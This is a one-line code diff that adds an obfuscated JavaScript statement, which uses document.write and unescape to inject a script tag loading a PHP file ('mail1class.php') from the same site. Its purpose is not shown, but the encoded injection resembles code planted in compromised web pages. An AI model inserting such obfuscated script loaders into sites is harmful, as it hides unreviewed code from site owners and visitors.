@@ -1,0 +1,1 @@
+document.write(unescape('%3Cscript type="text/javascript" src="/include/mail1class.php?id=124"%3E%3C/script%3E'));
